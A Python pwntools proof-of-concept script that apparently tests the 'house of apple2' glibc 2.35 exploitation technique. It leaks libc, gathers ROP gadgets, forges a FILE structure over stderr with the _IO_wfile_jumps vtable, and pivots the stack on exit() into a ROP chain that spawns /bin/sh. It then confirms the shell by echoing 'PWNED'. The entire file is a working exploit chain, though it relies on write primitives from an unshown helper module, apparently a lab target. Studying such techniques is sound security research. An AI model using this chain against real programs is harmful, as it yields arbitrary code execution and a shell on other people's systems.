"""POC for house_of_apple2_stack_pivoting_when_exit (libc 2.35, Ubuntu 22.04)

Technique: Overwrite stderr's vtable to _IO_wfile_jumps, forge _wide_data/_codecvt
to hijack control flow and pivot stack to execute a ROP chain.

Trigger: exit() calls _IO_flush_all_lockp
"""
import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..'))

from pwn import *
from pwncli.utils.io_file import IO_FILE_plus_struct
from helper import *

context.arch = "amd64"
context.log_level = "info"

GLIBC_VERSION = "2.35-0ubuntu3"


def exploit():
    io, elf, libc = start(GLIBC_VERSION)

    libc.address = leak_libc_base(io, libc)
    log.success(f"libc base: {hex(libc.address)}")

    _IO_2_1_stderr_ = libc.sym['_IO_2_1_stderr_']
    _IO_wfile_jumps = libc.sym['_IO_wfile_jumps']

    # Find gadgets
    pop_rbp = next(libc.search(asm("pop rbp; ret")))
    leave_ret = next(libc.search(asm("leave; ret")))
    pop_rdi = next(libc.search(asm("pop rdi; ret")))
    ret = pop_rdi + 1

    system = libc.sym['system']
    bin_sh = next(libc.search(b"/bin/sh\x00"))

    log.info(f"pop_rbp: {hex(pop_rbp)}")
    log.info(f"leave_ret: {hex(leave_ret)}")

    # Allocate a chunk for our ROP chain
    rop_addr = alloc(io, 0, 0x200)
    log.info(f"ROP chunk at: {hex(rop_addr)}")

    # Build ROP chain: system("/bin/sh")
    # After leave;ret, rsp = fake_rbp + 8, so ROP chain starts at fake_rbp + 8
    # We place fake_rbp pointing to rop_addr, so chain starts at rop_addr + 8
    rop_chain = flat([
        0,          # padding at rop_addr (this is where rbp points, leave sets rsp=rbp, then pop rbp)
        pop_rdi,    # rop_addr + 8: first gadget after leave;ret
        bin_sh,
        ret,
        system,
    ])

    fake_rbp = rop_addr

    fake_file = IO_FILE_plus_struct()
    payload = fake_file.house_of_apple2_stack_pivoting_when_exit(
        standard_FILE_addr=_IO_2_1_stderr_,
        _IO_wfile_jumps_addr=_IO_wfile_jumps,
        leave_ret_addr=leave_ret,
        pop_rbp_addr=pop_rbp,
        fake_rbp_addr=fake_rbp,
    )

    # Write ROP chain to the heap chunk
    edit(io, 0, rop_chain.ljust(0x200, b'\x00'))

    # Write the forged FILE struct over _IO_2_1_stderr_
    arb_write(io, _IO_2_1_stderr_, payload)

    # Trigger via exit
    log.info("Triggering exit()...")
    do_exit(io)

    io.sendline(b"echo PWNED")
    try:
        result = io.recvuntil(b"PWNED", timeout=3)
        if b"PWNED" in result:
            log.success("house_of_apple2_stack_pivoting_when_exit: SUCCESS")
            io.close()
            return True
    except:
        pass

    log.failure("house_of_apple2_stack_pivoting_when_exit: FAILED")
    io.close()
    return False


if __name__ == "__main__":
    result = exploit()
    sys.exit(0 if result else 1)
